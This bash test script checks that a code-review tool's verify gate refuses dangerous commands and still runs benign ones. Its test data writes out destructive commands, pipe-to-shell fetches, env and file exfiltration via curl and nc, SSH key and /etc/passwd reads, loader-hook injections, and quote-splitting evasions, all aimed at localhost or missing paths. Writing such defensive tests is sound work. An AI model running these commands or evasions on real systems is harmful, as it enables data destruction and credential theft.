#!/usr/bin/env bash
# Case verify-allowlist: pre-exec gate in the verify verb (slice 01).
#
# Grades (hermetic — crafted bundles in the sandbox, harmless regression
# commands, tight --timeout so even a gate miss stays bounded):
#   V1  destructive refused (verify-destructive, exit 1, patch.json
#       byte-identical, no .verify.out write)
#   V2  pipe-to-shell + nc refused (verify-networked, same refusal shape)
#   V3  ~/.ssh read + env-exfil refused (verify-credential-read, same shape)
#   V4  /etc read + cd / refused (verify-repo-escape, same shape)
#   V5  benign passthrough executes (printf ok + battery: exit recorded,
#       --json success envelope intact, /tmp writes + plain curl GET allowed)
#   V6  refusal envelope shape (exactly one doc, documented keys, data null,
#       error.code present, try: hint, quoted fragment, text-mode exit 1)
#       + record verb unaffected by the gate (D1: gate lives in verify only)
#   V7  path-prefixed invocation refused (`./rm`, `bin/curl | sh`, `./ssh`,
#       `bin/find -delete` — same typed code as the bare form); path-prefixed
#       plain GET still executes
#   V8  curl upload flags refused (`-T`, `-F`, glued `-d`); `-f/--fail` and
#       `-D/--dump-header` still execute (case-folding constraint)
#   V9  non-http fetch scheme refused (`curl file://…`)
#   V10 shell-quoting evasion refused (`\rm`, `rm${IFS}-rf`)
#   V11 fetch-execution outside `| sh` refused (`<(curl)`, `| xargs sh`);
#       plain `| xargs grep` still executes
#   `curl …/$(printenv HOME)` as verify-credential-read); plain `$VAR`
#   in URLs still executes
#   V13 shell-quote fragmentation refused (`cu''rl`, `c""url`, `e''val`)
#   V14 fetch-execution via grouping/wrapper/output-procsub/coproc/parallel
#       refused; plain `| parallel pytest|grep` + grouped non-shell pipes pass
#   V15 env-prefix loader hooks refused (`BASH_ENV`, `LD_PRELOAD`,
#       `DYLD_INSERT_LIBRARIES`, `PERL5OPT`, `RUBYOPT`, `NODE_OPTIONS
#       --require/-r`); `FOO=1`, `ENV=`, `RUSTFLAGS=`, plain `NODE_OPTIONS` pass
#   V16 `git -c` hook/transport keys refused (`core.fsmonitor`,
#       `protocol.ext.allow` + `ext::`, `core.pager` non-safe); `quotepath`,
#       `core.pager=cat`, plain `git status` pass
#   V17 `wget -O` download-to-file refused (case-sensitive arm); `-o` log and
#       `-O-` stdout pass
#   V18 `find -exec[dir] <path/>rm` refused; `-exec grep` passes
#   V19 GNU tar exec options refused; plain `tar -tzf` passes
#   V20 `ftp`/`tftp`/`lftp` refused, `rsync -e/--rsh` + remote-push refused;
#       local `rsync src/ dst/` passes
#
# Safety notes: the fork-bomb probe omits the trailing invocation (defines
# the function only — still matches the gate pattern, harmless if executed);
# git clean runs with -n (dry-run); destructive targets are sandbox-relative
# or nonexistent devices; networked targets point at the discard port.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=../lib/common.sh
. "$HERE/../lib/common.sh"

fails=0
good() { echo "  ok: $1"; }
bad() { echo "  FAIL: $1"; fails=$((fails + 1)); }

WANT_KEYS="at data error next pr repo schema_version verb warnings"

mk_verify() { # $1 = pr, $2 = verifyCmd
  local pr="$1" cmd="$2" dir="$EVAL_SANDBOX/.review/$1"
  mkdir -p "$dir"
  jq -n --arg c "$cmd" '{verifyCmd:$c}' > "$dir/patch.json"
}

refuse_probe() { # $1 = pr, $2 = want-code, $3 = label
  local pr="$1" want="$2" label="$3"
  local before after code docs msg
  before="$(shasum -a 1 "$EVAL_SANDBOX/.review/$pr/patch.json" | cut -d' ' -f1)"
  run_review verify acme/app "$pr" --json --timeout 10
  code="$(jq -r '.error.code // empty' <"$EVAL_OUT" 2>/dev/null || true)"
  docs="$(stdout_docs)"
  msg="$(jq -r '.error.message // empty' <"$EVAL_OUT" 2>/dev/null || true)"
  if [ "$EVAL_STATUS" -eq 1 ]; then
    good "$label exits exactly 1"
  else
    bad "$label exits $EVAL_STATUS, want exactly 1"
  fi
  if [ "$code" = "$want" ]; then
    good "$label refuses as $want"
  else
    bad "$label refuses as '$code', want '$want'"
  fi
  if [ "$docs" = "1" ] \
    && [ "$(jq -r '[keys_unsorted[]] | sort | join(" ")' <"$EVAL_OUT" 2>/dev/null || true)" = "$WANT_KEYS" ] \
    && jq -e '.data == null and (.error.code | type) == "string"' <"$EVAL_OUT" >/dev/null 2>&1; then
    good "$label refusal keeps the one-doc envelope (data null, string code)"
  else
    bad "$label refusal breaks the envelope shape"
  fi
  # Message shape: "refusing verifyCmd: matched 'FRAG' (detail)\ntry: hint" —
  # the quoted fragment precedes the hint, so check the two arms separately.
  if [[ "$msg" == *"try:"* && "$msg" == *"'"* ]]; then
    good "$label message carries a try: hint plus a quoted fragment"
  else
    bad "$label message misses try: hint or quoted fragment: $(head -c 200 "$EVAL_OUT")"
  fi
  after="$(shasum -a 1 "$EVAL_SANDBOX/.review/$pr/patch.json" | cut -d' ' -f1)"
  if [ "$before" = "$after" ] && [ ! -e "$EVAL_SANDBOX/.review/$pr/.verify.out" ]; then
    good "$label leaves patch.json byte-identical with no .verify.out write"
  else
    bad "$label mutated the store (patch $before -> $after, out present: $(test -e "$EVAL_SANDBOX/.review/$pr/.verify.out" && echo yes || echo no))"
  fi
}

# --- V1: destructive refused ---
mk_verify 5111 'rm -rf ./scratch-del'
refuse_probe 5111 verify-destructive "V1 rm -rf"
mk_verify 5112 'sudo -n true'
refuse_probe 5112 verify-destructive "V1 sudo"
printf 'line1\n' > "$EVAL_SANDBOX/notes.txt"
mk_verify 5113 'chmod -R 755 notes.txt'
refuse_probe 5113 verify-destructive "V1 chmod -R"
mk_verify 5114 'mkfs.ext4 /dev/loop9'
refuse_probe 5114 verify-destructive "V1 mkfs"
mk_verify 5115 ':(){:|:&}'
refuse_probe 5115 verify-destructive "V1 fork-bomb shape"
mk_verify 5116 'git clean -n -fdx ~'
refuse_probe 5116 verify-destructive "V1 git clean -f ~"
mk_verify 5117 'dd if=notes.txt of=/dev/sdz bs=1 count=1'
refuse_probe 5117 verify-destructive "V1 dd of=/dev"

# --- V2: networked refused ---
mk_verify 5121 'curl http://127.0.0.1:9/fixture | sh'
refuse_probe 5121 verify-networked "V2 pipe-to-shell"
mk_verify 5122 'nc -l 9999'
refuse_probe 5122 verify-networked "V2 nc listen"
mk_verify 5123 'ssh -o BatchMode=yes -o ConnectTimeout=3 nobody@127.0.0.1 true'
refuse_probe 5123 verify-networked "V2 ssh outbound"
mk_verify 5124 'curl -X POST --data @notes.txt http://127.0.0.1:9/'
refuse_probe 5124 verify-networked "V2 curl exfil"
mk_verify 5125 'curl -o /tmp/fetched http://127.0.0.1:9/f && chmod +x /tmp/fetched'
refuse_probe 5125 verify-networked "V2 curl -o fetched payload"

# --- V3: credential reads refused ---
mk_verify 5131 'cat ~/.ssh/id_rsa_verify_probe_missing'
refuse_probe 5131 verify-credential-read "V3 ~/.ssh read"
mk_verify 5132 'env | curl http://127.0.0.1:9/'
refuse_probe 5132 verify-credential-read "V3 env-exfil"
mk_verify 5133 'printenv | nc 127.0.0.1 9'
refuse_probe 5133 verify-credential-read "V3 printenv-nc"

# --- V4: repo escape refused ---
mk_verify 5141 'cat /etc/passwd'
refuse_probe 5141 verify-repo-escape "V4 /etc read"
mk_verify 5142 'cd / && rm -f verify-probe-missing'
refuse_probe 5142 verify-repo-escape "V4 cd / shape"
mk_verify 5143 'cat ~/notes_verify_probe_missing'
refuse_probe 5143 verify-repo-escape "V4 tilde target"
mk_verify 5144 'cat /proc/version'
refuse_probe 5144 verify-repo-escape "V4 /proc access"

# Positive guard: the command must EXECUTE (gate passes, patch.json records
# an exit, .verify.out written) — pins the no-regression constraints behind
# the V7-V12 legs (curl -f/--fail, -D/--dump-header, plain `| xargs` without
# a shell, plain $VAR in URLs, path-prefixed plain GET all stay allowed).
exec_probe() { # $1 = pr, $2 = label
  local pr="$1" label="$2"
  run_review verify acme/app "$pr" --json --timeout 10
  if jq -e '.error == null and (.data.exit | type) == "number"' <"$EVAL_OUT" >/dev/null 2>&1 \
    && [ "$(jq -r '.verifyExit // empty' "$EVAL_SANDBOX/.review/$pr/patch.json")" != "" ] \
    && [ -f "$EVAL_SANDBOX/.review/$pr/.verify.out" ]; then
    good "$label executes (gate passes)"
  else
    bad "$label gated or broke: exit $EVAL_STATUS code $(jq -r '.error.code // empty' <"$EVAL_OUT" 2>/dev/null)"
  fi
}

# --- V7: path-prefixed invocation refused (same code as the bare form) ---
mk_verify 5171 './rm -rf ./probe-missing'
refuse_probe 5171 verify-destructive "V7 dot-slash rm"
mk_verify 5172 'bin/curl http://127.0.0.1:9/fixture | sh'
refuse_probe 5172 verify-networked "V7 path curl pipe-to-shell"
mk_verify 5173 './ssh -o BatchMode=yes -o ConnectTimeout=3 nobody@127.0.0.1 true'
refuse_probe 5173 verify-networked "V7 dot-slash ssh"
mk_verify 5174 'bin/find . -name verify-probe-missing -delete'
refuse_probe 5174 verify-destructive "V7 path find-delete"
mk_verify 5175 './curl http://127.0.0.1:9/fixture'
exec_probe 5175 "V7 guard path-prefixed plain GET executes"

# --- V8: curl upload flags refused; -f/--fail and -D/--dump-header execute ---
mk_verify 5181 'curl -T ./probe-missing-upload http://127.0.0.1:9/'
refuse_probe 5181 verify-networked "V8 curl -T upload"
mk_verify 5182 'curl -F f=@./probe-missing-upload http://127.0.0.1:9/'
refuse_probe 5182 verify-networked "V8 curl -F form"
mk_verify 5183 'curl -dsecret http://127.0.0.1:9/'
refuse_probe 5183 verify-networked "V8 curl glued -d"
mk_verify 5184 'curl -fsSL http://127.0.0.1:9/fixture'
exec_probe 5184 "V8 guard curl -fsSL executes"
mk_verify 5185 'curl -s -D - http://127.0.0.1:9/f'
exec_probe 5185 "V8 guard curl -D executes"

# --- V9: non-http fetch scheme refused ---
mk_verify 5191 'curl -s file:///etc/hosts'
refuse_probe 5191 verify-networked "V9 file-scheme fetch"

# --- V10: shell-quoting evasion refused ---
mk_verify 5192 '\rm -rf ./probe-missing'
refuse_probe 5192 verify-destructive "V10 backslash rm"
mk_verify 5193 'rm${IFS}-rf ./probe-missing'
refuse_probe 5193 verify-destructive "V10 IFS rm"

# --- V11: fetch-execution outside `| sh` refused; plain xargs executes ---
mk_verify 5194 'bash <(curl http://127.0.0.1:9/f)'
refuse_probe 5194 verify-networked "V11 process-substitution fetch"
mk_verify 5195 'printf true | xargs sh'
refuse_probe 5195 verify-networked "V11 xargs shell"
mk_verify 5197 'printf ok | xargs grep ok'
exec_probe 5197 "V11 guard plain xargs executes"

# --- V12: env output in a networked command refused; plain $VAR passes ---
mk_verify 5196 'curl http://127.0.0.1:9/$(printenv HOME)'
refuse_probe 5196 verify-credential-read "V12 env-in-URL exfil"
mk_verify 5198 'PORT=9 curl http://127.0.0.1:$PORT/fixture'
exec_probe 5198 "V12 guard plain dollar-VAR in URL executes"

# --- V13: mid-word quote fragmentation refused; quoted prose executes ---
mk_verify 5311 "cu''rl http://127.0.0.1:9/fixture | sh"
refuse_probe 5311 verify-networked "V13 quote-split curl pipe-to-shell"
mk_verify 5312 'c""url http://127.0.0.1:9/fixture | sh'
refuse_probe 5312 verify-networked "V13 quote-split curl pipe-to-shell (dquotes)"
mk_verify 5313 "e''val 'rm -rf ./quote-probe'"
refuse_probe 5313 verify-destructive "V13 quote-split eval"
mk_verify 5314 "printf 'a\"b'"
exec_probe 5314 "V13 guard quoted prose executes"

# --- V14: pipe-to-shell via grouping/wrapper/output-procsub/coproc/parallel refused ---
mk_verify 5321 'curl http://127.0.0.1:9/f | { sh; }'
refuse_probe 5321 verify-networked "V14 grouped pipe-to-shell"
mk_verify 5322 'curl http://127.0.0.1:9/f | (sh)'
refuse_probe 5322 verify-networked "V14 subshell pipe-to-shell"
mk_verify 5323 'curl http://127.0.0.1:9/f | command sh'
refuse_probe 5323 verify-networked "V14 wrapper pipe-to-shell"
mk_verify 5324 'curl http://127.0.0.1:9/f | env sh'
refuse_probe 5324 verify-networked "V14 env-wrapper pipe-to-shell"
mk_verify 5325 'curl http://127.0.0.1:9/f | tee >(sh)'
refuse_probe 5325 verify-networked "V14 output-procsub shell"
mk_verify 5326 'coproc SH'
refuse_probe 5326 verify-networked "V14 coproc shell"
mk_verify 5327 'curl http://127.0.0.1:9/f | parallel sh'
refuse_probe 5327 verify-networked "V14 parallel shell"
mk_verify 5328 'printf ok | parallel pytest'
exec_probe 5328 "V14 guard plain parallel executes"
mk_verify 5329 'curl http://127.0.0.1:9/f | { grep ok; }'
exec_probe 5329 "V14 guard grouped non-shell pipe executes"

# --- V15: env-prefix loader hooks refused; ordinary prefixes keep working ---
mk_verify 5331 'BASH_ENV=/tmp/verify-allowlist-n15 bash -c true'
refuse_probe 5331 verify-destructive "V15 BASH_ENV prefix"
mk_verify 5332 'LD_PRELOAD=/tmp/verify-allowlist-n15.so printf ok'
refuse_probe 5332 verify-destructive "V15 LD_PRELOAD prefix"
mk_verify 5333 'PERL5OPT=-MDevel::Cover perl -e 1'
refuse_probe 5333 verify-destructive "V15 PERL5OPT prefix"
mk_verify 5334 "NODE_OPTIONS=--require /tmp/verify-allowlist-n15.js node -e '1'"
refuse_probe 5334 verify-destructive "V15 NODE_OPTIONS --require"
mk_verify 5335 'NODE_OPTIONS=--max-old-space-size=4096 printf ok'
exec_probe 5335 "V15 guard NODE_OPTIONS without preload arm executes"
mk_verify 5336 'ENV=prod printf ok'
exec_probe 5336 "V15 guard ENV= app var executes"
mk_verify 5337 'RUSTFLAGS=-Awarnings printf ok'
exec_probe 5337 "V15 guard RUSTFLAGS executes"

# --- V16: git -c hook/transport keys refused; benign keys keep working ---
mk_verify 5341 'git -c core.fsmonitor=touch-verify-probe status'
refuse_probe 5341 verify-destructive "V16 git fsmonitor"
mk_verify 5342 "git -c protocol.ext.allow=always ls-remote 'ext::touch-verify-probe'"
refuse_probe 5342 verify-destructive "V16 git ext transport"
mk_verify 5343 'git -c core.pager=touch-verify-probe log'
refuse_probe 5343 verify-destructive "V16 git pager command"
mk_verify 5344 'git -c core.quotepath=false diff'
exec_probe 5344 "V16 guard benign git -c key executes"
mk_verify 5345 'git -c core.pager=cat log'
exec_probe 5345 "V16 guard core.pager=cat executes"
mk_verify 5346 'git status'
exec_probe 5346 "V16 guard plain git status executes"

# --- V17: wget -O refused (dead-case fix); -o log and -O- stdout keep working ---
mk_verify 5351 'wget -O /tmp/verify-allowlist-n17 http://127.0.0.1:9/f'
refuse_probe 5351 verify-networked "V17 wget -O download-to-file"
mk_verify 5352 'wget -o /tmp/verify-allowlist-wget-log http://127.0.0.1:9/f'
exec_probe 5352 "V17 guard wget -o logfile executes"
rm -f /tmp/verify-allowlist-wget-log
mk_verify 5353 'wget -qO- http://127.0.0.1:9/f'
exec_probe 5353 "V17 guard wget -O- stdout executes"

# --- V18: find -exec with a path-prefixed rm refused; -exec grep keeps working ---
mk_verify 5361 'find . -name verify-probe-missing -exec bin/rm -- {} \;'
refuse_probe 5361 verify-destructive "V18 find -exec path-prefixed rm"
mk_verify 5362 'find . -name verify-probe-missing -execdir bin/rm -- {} \;'
refuse_probe 5362 verify-destructive "V18 find -execdir path-prefixed rm"
mk_verify 5363 "find . -name '*.tmp' -exec grep -l foo {} \;"
exec_probe 5363 "V18 guard find -exec grep executes"

# --- V19: GNU tar exec options refused; plain tar keeps working ---
mk_verify 5371 'tar --checkpoint=1 --checkpoint-action=exec=touch-verify-probe -cf /tmp/verify-allowlist-n19.tar files'
refuse_probe 5371 verify-destructive "V19 tar checkpoint-action exec"
mk_verify 5372 'tar --use-compress-program=touch-verify-probe -cf /tmp/verify-allowlist-n19b.tar files'
refuse_probe 5372 verify-destructive "V19 tar use-compress-program"
mk_verify 5373 'tar -tzf verify-probe-missing.tar.gz'
exec_probe 5373 "V19 guard plain tar executes"

# --- V20: ftp/tftp + rsync -e/remote refused; local rsync keeps working ---
mk_verify 5381 'ftp -n 127.0.0.1'
refuse_probe 5381 verify-networked "V20 ftp client"
mk_verify 5382 'tftp -g -r verify-probe-missing 127.0.0.1'
refuse_probe 5382 verify-networked "V20 tftp client"
mk_verify 5383 "rsync -e 'touch-verify-probe' src nohost:/tmp/x"
refuse_probe 5383 verify-networked "V20 rsync -e local exec"
mk_verify 5384 'rsync -av src/ 127.0.0.1:/tmp/x'
refuse_probe 5384 verify-networked "V20 rsync remote push"
mk_verify 5385 'rsync -av notes.txt /tmp/verify-allowlist-rsync-probe'
exec_probe 5385 "V20 guard local rsync executes"
rm -f /tmp/verify-allowlist-rsync-probe
mk_verify 5386 'lftp -c "open 127.0.0.1"'
refuse_probe 5386 verify-networked "V20 lftp client"

# --- V5: benign passthrough executes ---
mk_verify 5151 'printf ok'
run_review verify acme/app 5151 --json --timeout 10
if [ "$EVAL_STATUS" -eq 0 ] && [ "$(stdout_docs)" = "1" ] \
  && [ "$(jq -r '[keys_unsorted[]] | sort | join(" ")' <"$EVAL_OUT" 2>/dev/null || true)" = "$WANT_KEYS" ] \
  && jq -e '.error == null and .data.exit == 0 and .data.timedOut == false' <"$EVAL_OUT" >/dev/null 2>&1 \
  && [ "$(jq -r '.data.outputTail' <"$EVAL_OUT")" = "ok" ] \
  && [ "$(jq -r '.verb' <"$EVAL_OUT")" = "verify" ]; then
  good "V5 printf ok executes (exit 0 recorded, success envelope intact)"
else
  bad "V5 printf ok gave exit $EVAL_STATUS: $(head -c 300 "$EVAL_OUT")"
fi
if [ "$(jq -r '.verifyExit' "$EVAL_SANDBOX/.review/5151/patch.json")" = "0" ] \
  && [ "$(jq -r '.verifiedTail' "$EVAL_SANDBOX/.review/5151/patch.json")" = "ok" ]; then
  good "V5 patch.json records the pass (verifyExit 0, tail ok)"
else
  bad "V5 patch.json: $(cat "$EVAL_SANDBOX/.review/5151/patch.json" 2>/dev/null)"
fi
if [ -f "$EVAL_SANDBOX/.review/5151/.verify.out" ] \
  && [ "$(cat "$EVAL_SANDBOX/.review/5151/.verify.out")" = "ok" ]; then
  good "V5 .verify.out holds the command output"
else
  bad "V5 .verify.out missing or wrong"
fi

# Benign battery: each must EXECUTE (patch.json mutated, envelope error
# null) rather than refuse. Exit values vary (curl conn-refused, go with no
# module) — execution, not the exit, is the assertion.
printf '%s\n' 'printf ok | grep ok' 'FOO=1 printf ok' 'cd . && printf ok' \
  'git diff --stat' 'GOPROXY=off go test ./...' 'curl http://127.0.0.1:9/fixture' \
  'printf ok > /tmp/verify-allowlist-probe && cat /tmp/verify-allowlist-probe' > "$EVAL_SANDBOX/v5-battery.txt"
n=0
while IFS= read -r cmd; do
  [ -z "$cmd" ] && continue
  n=$((n + 1))
  pr=$((5160 + n))
  mk_verify "$pr" "$cmd"
  run_review verify acme/app "$pr" --json --timeout 10
  if jq -e '.error == null and (.data.exit | type) == "number"' <"$EVAL_OUT" >/dev/null 2>&1 \
    && [ "$(jq -r '.verifyExit // empty' "$EVAL_SANDBOX/.review/$pr/patch.json")" != "" ] \
    && [ -f "$EVAL_SANDBOX/.review/$pr/.verify.out" ]; then
    good "V5 battery executes ($cmd)"
  else
    bad "V5 battery refused or broke ($cmd): exit $EVAL_STATUS code $(jq -r '.error.code // empty' <"$EVAL_OUT" 2>/dev/null)"
  fi
done < "$EVAL_SANDBOX/v5-battery.txt"
rm -f /tmp/verify-allowlist-probe

# --- V6: refusal envelope + text exit + record untouched ---
mk_verify 5199 'rm -rf ./text-probe'
before="$(shasum -a 1 "$EVAL_SANDBOX/.review/5199/patch.json" | cut -d' ' -f1)"
run_review verify acme/app 5199 --timeout 10
after="$(shasum -a 1 "$EVAL_SANDBOX/.review/5199/patch.json" | cut -d' ' -f1)"
if [ "$EVAL_STATUS" -eq 1 ] \
  && grep -q "refusing verifyCmd" "$EVAL_ERR" \
  && grep -q "try:" "$EVAL_ERR" \
  && grep -q "'" "$EVAL_ERR"; then
  good "V6 text-mode refusal exits 1 with fragment + try: hint (typed code rides the --json envelope)"
else
  bad "V6 text-mode refusal gave exit $EVAL_STATUS: $(head -c 200 "$EVAL_ERR")"
fi
if [ "$before" = "$after" ] && [ ! -e "$EVAL_SANDBOX/.review/5199/.verify.out" ]; then
  good "V6 text-mode refusal leaves the store untouched"
else
  bad "V6 text-mode refusal mutated the store"
fi

# D1: the gate lives in verify only — record stores a nasty verifyCmd claim
# without refusing (record never executes; damage happens at execution).
mkdir -p "$EVAL_SANDBOX/.review/local-vallow"
cat > "$EVAL_SANDBOX/.review/local-vallow/source.json" <<'EOF'
{"head_sha":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","base_sha":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb","head_ref":"work"}
EOF
cat > "$EVAL_SANDBOX/.review/local-vallow/full.diff" <<'EOF'
diff --git a/notes.txt b/notes.txt
index 1111111..2222222 100644
--- a/notes.txt
+++ b/notes.txt
@@ -1,3 +1,3 @@
 top
-old line
+new line
 bottom
EOF
cat > "$EVAL_SANDBOX/.review/local-vallow/review.json" <<'EOF'
{"schema_version":"1","body":"> [!IMPORTANT]\n> Real record-path issue below.","approved":false,"comments":[{"path":"notes.txt","line":2,"side":"RIGHT","body":"Rec verify me.","rigor":"walked","severity":"important"}]}
EOF
jq -n '{verifyCmd:"rm -rf ./record-probe"}' > "$EVAL_SANDBOX/.review/local-vallow/patch.json"
run_review record acme/app local-vallow --json
if [ "$EVAL_STATUS" -eq 0 ]; then
  good "V6 record stores claims without gating (first pass exit 0)"
else
  bad "V6 first record exits $EVAL_STATUS"
fi
sig="$(jq -r '.[0].sig' "$EVAL_SANDBOX/.review/local-vallow/findings.json" 2>/dev/null || true)"
jq -n --arg s "$sig" '[{sig:$s,verdict:"VERIFIED",resultHead:"aaaaaaa",verifyCmd:"rm -rf ./record-probe"}]' \
  > "$EVAL_SANDBOX/.review/local-vallow/verification.json"
run_review record acme/app local-vallow --json
if [ "$EVAL_STATUS" -eq 0 ] \
  && [ "$(jq -r '.[0].status' "$EVAL_SANDBOX/.review/local-vallow/findings.json")" = "addressed" ] \
  && jq -e '.[0].history[-1].note | contains("rm -rf ./record-probe")' "$EVAL_SANDBOX/.review/local-vallow/findings.json" >/dev/null 2>&1; then
  good "V6 record keeps the nasty verifyCmd claim unrefused (gate is verify-only)"
else
  bad "V6 second record exits $EVAL_STATUS (gate leaked into record?)"
fi

if [ "$fails" -ne 0 ]; then echo "case verify-allowlist: FAIL ($fails)"; exit 1; fi
echo "case verify-allowlist: PASS"
